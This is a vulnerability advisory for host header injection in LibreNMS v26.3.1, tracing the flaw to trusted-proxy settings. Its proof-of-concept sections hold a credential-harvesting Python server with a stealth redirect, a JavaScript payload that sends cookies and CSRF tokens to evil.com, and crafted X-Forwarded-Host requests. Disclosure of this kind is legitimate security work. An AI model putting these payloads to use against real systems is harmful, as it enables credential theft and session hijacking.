# Host Header Injection

**Affected Product:** LibreNMS  
**Affected Version:** v26.3.1

---

### Summary

LibreNMS is vulnerable to Host Header Injection attacks due to improper validation of the `Host` and `X-Forwarded-Host` HTTP headers. The application trusts user-supplied host headers without any whitelist validation, allowing attackers to poison URLs throughout the entire application. 

This vulnerability enables:
- **Credential theft** via poisoned login forms
- **Password reset token interception**  
- **Session hijacking** through cookie theft
- **Cache poisoning** (when CDN/reverse proxy is present)
- **JavaScript injection** via asset poisoning

**Root Cause:** The `config/trustedproxy.php` configuration trusts all proxies (`'proxies' => '*'`) and trusts the `X-Forwarded-Host` header, causing Laravel's URL helpers (`url()`, `route()`, `asset()`) to generate malicious URLs pointing to attacker-controlled domains.

---

### Details

#### 1. Root Cause - TrustedProxy Misconfiguration

**File:** `config/trustedproxy.php`

**Vulnerable Code (Lines 28, 58-62):**
```php
return [
    // Line 28 - Trusts ALL proxies!
    'proxies' => LibreNMS\Util\EnvHelper::parseArray('APP_TRUSTED_PROXIES', '*', ['', '*', '**']),

    // Lines 58-62 - Trusts X-Forwarded-Host header!
    'headers' => Request::HEADER_X_FORWARDED_FOR |
        Request::HEADER_X_FORWARDED_HOST |     //VULNERABLE
        Request::HEADER_X_FORWARDED_PORT |
        Request::HEADER_X_FORWARDED_PROTO |
        Request::HEADER_X_FORWARDED_AWS_ELB,
];
```

**Issue:** When `HEADER_X_FORWARDED_HOST` is trusted, Laravel updates the internal Request object's host from this header. All URL generation functions then use the poisoned host value.

#### 2. Secondary Vulnerability - Unvalidated SERVER_NAME Usage

**File:** `app/ConfigRepository.php` (Lines 397-403)

```php
private function loadPreUserConfigDefaults(): void
{
    // ...
    
    if (isset($_SERVER['SERVER_NAME']) && isset($_SERVER['SERVER_PORT'])) {
        $port = $_SERVER['SERVER_PORT'] != 80 ? ':' . $_SERVER['SERVER_PORT'] : '';
        $server = Str::contains($_SERVER['SERVER_NAME'], ':') ? 
            "[{$_SERVER['SERVER_NAME']}]" : $_SERVER['SERVER_NAME'];
        Arr::set($this->config, 'base_url', "http://$server$port/");
    }
}
```

#### 3. Affected URL Generation Functions

All Laravel URL helpers are compromised when the host header is poisoned:

```php
url('/login')              // Returns: http://evil.com/login
route('home')               // Returns: http://evil.com/
asset('css/app.css')        // Returns: http://evil.com/css/app.css
action('HomeController')     // Returns: http://evil.com/
```

#### 4. Affected Endpoints

The following endpoints are confirmed vulnerable:

| Endpoint | Method | Impact |
|----------|--------|--------|
| `/login` | GET/POST | Form action poisoned → credentials sent to attacker |
| `/overview` | GET | All links/assets poisoned → cookie theft possible |
| `/password/reset` | GET/POST | Reset links poisoned → token interception |
| `/` | GET | Homepage poisoned → phishing |
| `/dashboard` | GET | Dashboard poisoned |
| `/map/custom` | GET | Map URLs poisoned |
| `/widgets/custom-map` | GET | Widget URLs poisoned |
| `/validate` | GET | Validation URLs poisoned |
| `/device/{id}` | GET | Device page URLs poisoned |

---

### PoC

#### Proof of Concept 1: Credential Theft via /login

*Step 1: Local DNS Override*
```bash
sudo nano /etc/hosts
# add 127.0.0.1  evil.com
```

*Step 2: Set up and run an HTTP server to receive credentials.*
```bash
nano server.py
```
Paste the following Python source code into the file and save it.
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # ===== Read body =====
        length = int(self.headers.get('Content-Length', 0))
        raw_body = self.rfile.read(length).decode(errors="ignore")

        parsed = urllib.parse.parse_qs(raw_body)

        username = parsed.get('username', [''])[0]
        password = parsed.get('password', [''])[0]

        # ===== Capture headers =====
        headers_dict = dict(self.headers)

        cookies = self.headers.get('Cookie', '')
        user_agent = self.headers.get('User-Agent', '')
        referer = self.headers.get('Referer', '')
        client_ip = self.client_address[0]

        # ===== Pretty output =====
        print("\n" + "="*50)
        print("[+] NEW CAPTURE")
        print("="*50)

        print(f"[IP]        {client_ip}")
        print(f"[UserAgent] {user_agent}")
        print(f"[Referer]   {referer}")

        print("\n[+] CREDENTIALS")
        print(f"Username: {username}")
        print(f"Password: {password}")

        print("\n[+] COOKIES")
        print(cookies if cookies else "(none)")

        print("\n[+] RAW BODY")
        print(raw_body)

        print("\n[+] HEADERS")
        for k, v in headers_dict.items():
            print(f"{k}: {v}")

        # ===== Optional: save to file =====
        data = {
            "ip": client_ip,
            "username": username,
            "password": password,
            "cookies": cookies,
            "user_agent": user_agent,
            "referer": referer,
            "headers": headers_dict,
            "body": raw_body
        }

        with open("captured.json", "a") as f:
            f.write(json.dumps(data) + "\n")

        # ===== Stealth redirect =====
        self.send_response(302)
        self.send_header('Location', 'http://192.168.74.130:8000/dashboard')
        self.end_headers()


server = HTTPServer(("0.0.0.0", 80), Handler)
print("[*] Attacker server listening on port 80...")
server.serve_forever()
```
```bash
# run the server
python server.py
```

*Step 3: Intercept and send the request with the X-Forwarded-Host header.*
Turn on intercept in BurpSuite
```URL
# On your browser:
http://192.168.74.130:8000/login
```
PoC Request:
```http
GET /login HTTP/1.1

Host: 192.168.74.130:8000
X-Forwarded-Host: evil.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: XSRF-TOKEN=eyJpdiI6IkJSejAvVVJuZTMyK3RHM2tSVXF4d1E9PSIsInZhbHVlIjoiS3hrclI0NmhXa0xJcE5RU0JWSUlUR05IZUcxS2Ntb2F2SkN6N2J3dzdnUkE2dHFtaWxkV2JwRGk2WmJxQ3FkSm1JcG5sRHB6NzdkTnJiRFZUdnlHbVZ5Nkw1UEFKY25MYzZzOExWYlM1QXZhVHhxQmQwTnZteHluU3lVR0VlYi8iLCJtYWMiOiJjNWI2ZmMzNjBhNDM4YzQxZDZkYzk1MGY2YWIzYTMwMWNiMDVhOWZiYWZkNTJmYjcyMWZiMjI3ZjQyZTA1MTRlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImdQTk1WQVZXMlB3djNLa0FZTFZQd0E9PSIsInZhbHVlIjoiUGFvU1hMb3htUlBIT01FUkhZRVdjNklEKzRiMXYreFJmaDYxemFzb0E3UGVDOXJIRi9zU2M0eGVDT20wNzMvNlN6VTR2L1Y2RnVmQzlKV2lLRDJQRXVOMEFYRHNXbDNsUXdWZHJHdjB4SWNxOWhTZHIyanJLRGlyN2NqRkZ2NC8iLCJtYWMiOiJiNDUwNmFkOThhODc4M2JiNjEwOWZkZmNhZGZhZWNhZGQ1YTg0NGI1MmRiN2U3YmIxYmUwN2M1N2E1ZGUyZTE1IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Enter credentials
<img width="923" height="464" alt="image" src="https://github.com/user-attachments/assets/b26aec3c-62f6-4d9f-a8ac-9ca24ea78286" />

Server captured the credential
<img width="801" height="527" alt="image" src="https://github.com/user-attachments/assets/cf81c808-0404-4d17-aba7-5a3127c20663" />


---

#### Proof of Concept 2: Cookie Theft via /overview

**Attack Scenario:** Attacker poisons the overview page to steal session cookies via malicious JavaScript.

*Step 1: Local DNS Override*
```bash
sudo nano /etc/hosts
# add 127.0.0.1  evil.com
```

*Step 2: Create a malicious JavaScript file and launch an HTTP server*
PoC JavaScript
```js
(function() {
    alert("XSS: " + document.domain);
    var collab = "http://evil.com";
    new Image().src = collab + "/?ping=1";
    new Image().src = collab + "/?cookie=" + encodeURIComponent(document.cookie);
    var token = document.querySelector('meta[name="csrf-token"]');
    if (token) {
        new Image().src = collab + "/?csrf=" + encodeURIComponent(token.content);
    }
    fetch('/api/user', {credentials: 'include'})
        .then(r => r.text())
        .then(data => {
            new Image().src = collab + "/?data=" + encodeURIComponent(data);
        })
        .catch(e => {
            new Image().src = collab + "/?error=" + encodeURIComponent(e);
        });
    fetch(collab + "/?fetch=1", {
        method: "POST",
        mode: "no-cors",
        body: document.cookie
    });
})();
```
Run HTTP server
```bash
python -m http.server 80
```

*Step 3: Poison all assets on overview page*
Turn on intercept on BurpSuite
```URL
# On your browser:
http://192.168.74.130:8000/overview
```

PoC Request
```http
GET /overview HTTP/1.1

Host: 192.168.74.130:8000
X-Forwarded-Host: evil.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.74.130:8000/
Cookie: XSRF-TOKEN=eyJpdiI6ImRLRWRYaGlTOGV3NEloeURzbTBZRFE9PSIsInZhbHVlIjoiVFp3UlFhbHFxUFlWa2poaDQwanVyQ1ZtNXFFQ1kreVBaRWczRFNzb25RTkpnVHJrZmhIY21ybGdiRSs3RkpqTTZkLzNKOXFjSnM3bTVPazk2cDFoL2FGVC9hRURENnBuZkFxNGhEZENjbzlybVJiaE5rLzVQc2p2cDVpWXZ6MWgiLCJtYWMiOiI2NzM3ZjQyZGE1MDY4YjgyZjdhYjUzMzQ2MDk2MTZlYWJkZTc5OWMwOGQ4NTYxNjNkYmZjMWUyM2U2OTg5ZjNiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjkzQ044MDNhdm5mV29yTzUxeUpnVWc9PSIsInZhbHVlIjoiWFdaTDNxR1JxUHE2S3I4Q1R4N3VUU1lsUjNHL3hsZVFmb2Z3WmF4WU9HdUE5Y0VTRm0rZWhTcXgybFhyc0RPWFRyaDZOd1JRZ2NoTDZ6N3VNcnowaTI3ZjJDSk5ISjBBTWpWNnBhT0YzSjNOTWlPdnpLaDhhd1FYdE9GUjVYaEIiLCJtYWMiOiI4YTdlMDI2YzBlNDFkZjc2ZmE3ZTM3MjM5NmFjMTQ5OTNlMjI2NGFjYTA2MzY2YmFiZWI1OGVkNGY1NWYyM2M2IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

JavaScript code executed
<img width="1216" height="672" alt="image" src="https://github.com/user-attachments/assets/267267f6-ddef-49e9-a11c-05ffbd44f21d" />
HTTP server got cookie
<img width="1231" height="310" alt="image" src="https://github.com/user-attachments/assets/bc35d9c8-83f6-44ac-8fd6-bdb47401349b" />


---

### Impact

**Vulnerability Classification:**
- **CWE-601:** URL Redirection to Untrusted Site
- **OWASP:** A01:2021 – Broken Access Control

**Affected Components:**
- Authentication system (login forms)
- Password reset functionality  
- All URL generation throughout the application
- Asset loading (CSS, JavaScript, images)
- Multi-tenancy branding system

**Attack Scenarios:**

1. **Credential Harvesting:** Attackers can create phishing pages where login forms submit to attacker-controlled domains, capturing usernames and passwords.

2. **Account Takeover:** By poisoning password reset emails, attackers can intercept reset tokens and gain unauthorized access to any user account.

3. **Session Hijacking:** Malicious JavaScript injected via poisoned assets can steal session cookies, allowing attackers to hijack active user sessions.

4. **Cache Poisoning:** If deployed behind a CDN or reverse proxy, poisoned responses can be cached and served to all users, amplifying the attack.

5. **Phishing Campaigns:** Attackers can generate legitimate-looking LibreNMS URLs that actually point to malicious servers, facilitating large-scale phishing operations.

**User Impact:**
- All users are affected, including administrators
- Credentials can be stolen without user awareness
- Password reset tokens can be intercepted
- Active sessions can be hijacked
- No special privileges required to exploit

### Additional Information
The vendor is aware of the issue but has chosen not to remediate it, instead relying solely on documentation to inform users of the risk :))
